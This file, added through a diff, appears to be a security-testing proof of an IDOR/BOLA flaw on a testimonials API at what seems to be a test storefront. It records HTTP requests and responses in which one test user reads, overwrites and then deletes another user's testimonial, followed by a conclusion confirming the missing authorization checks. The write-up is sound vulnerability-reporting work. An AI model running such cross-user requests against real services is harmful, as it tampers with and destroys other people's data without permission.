@@ -1,0 +1,53 @@
+=== IDOR/BOLA Proof on /api/v1/testimonials/{id} ===
+
+User A (testuser1): b90a19b3-72df-448e-b42e-ca0d552338e5
+User B (testuser2): abb4b216-1ab4-4ff1-8537-eb8deb5f6d1a
+
+Testimonial ID 9 belongs to User A:
+{
+  "id": 9,
+  "user_id": "b90a19b3-72df-448e-b42e-ca0d552338e5",
+  "content": "Test testimonial from user_a",
+  "rating": 5
+}
+
+--- 1. CROSS-USER READ (User B reads User A's testimonial) ---
+Request:
+GET https://duck-store.escape.tech/api/v1/testimonials/9
+Authorization: Bearer <user_b_token>
+
+Response (200 OK):
+{"id":9,"user_id":"b90a19b3-72df-448e-b42e-ca0d552338e5","user":{"id":"b90a19b3-72df-448e-b42e-ca0d552338e5","username":"testuser1"},"guest_name":null,"guest_role":null,"guest_avatar_url":null,"content":"Test testimonial from user_a","rating":5,"is_featured":false,"created_at":"2026-09-29T08:31:54.602837","name":"testuser1","role":"Duck Lover","avatar_url":null}
+
+--- 2. CROSS-USER MODIFY/PUT (User B modifies User A's testimonial) ---
+Request:
+PUT https://duck-store.escape.tech/api/v1/testimonials/9
+Authorization: Bearer <user_b_token>
+Content-Type: application/json
+{"content": "MODIFIED BY USER_B VIA IDOR", "rating": 1}
+
+Response (200 OK):
+{"id":9,"user_id":"b90a19b3-72df-448e-b42e-ca0d552338e5","user":{"id":"b90a19b3-72df-448e-b42e-ca0d552338e5","username":"testuser1"},"guest_name":null,"guest_role":null,"guest_avatar_url":null,"content":"MODIFIED BY USER_B VIA IDOR","rating":1,"is_featured":false,"created_at":"2026-09-29T08:31:54.602837","name":"testuser1","role":"Duck Lover","avatar_url":null}
+
+--- 3. CROSS-USER DELETE (User B deletes User A's testimonial) ---
+Request:
+DELETE https://duck-store.escape.tech/api/v1/testimonials/9
+Authorization: Bearer <user_b_token>
+
+Response (204 No Content):
+HTTP/2 204
+content-type: application/json
+date: Tue, 29 Sep 2026 09:13:06 GMT
+server: uvicorn
+
+--- 4. VERIFICATION - Testimonial no longer exists ---
+Request:
+GET https://duck-store.escape.tech/api/v1/testimonials/9
+Authorization: Bearer <user_b_token>
+
+Response (404 Not Found):
+{"detail":"Testimonial not found"}
+
+=== CONCLUSION ===
+User B successfully READ, MODIFIED, and DELETED User A's testimonial (ID 9)
+without any authorization checks. This confirms the BOLA/IDOR vulnerability.
